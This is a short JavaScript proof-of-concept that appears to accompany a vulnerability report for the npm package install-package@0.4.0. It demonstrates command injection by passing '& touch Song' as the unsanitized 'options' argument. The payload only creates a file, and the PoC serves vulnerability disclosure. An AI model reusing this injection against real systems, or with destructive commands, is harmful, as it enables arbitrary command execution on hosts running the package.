/**
 * install-package@0.4.0 is vulnerable to command injection.
 * the injection point is located in line 82 of index file "index.js" in
 * module.exports function(packages, options, execOptions).
 * the second argument "options" can be controlled by users without any sanitization.
 * Note: when run this poc, we set the "packaged" parameters to be "", so no 
 * package can be installed, the poc is blocked. So after using "ctrl c" to stop
 * the poc, there will be file named "Song".
 */

var root = require("install-package");
root("", "& touch Song");

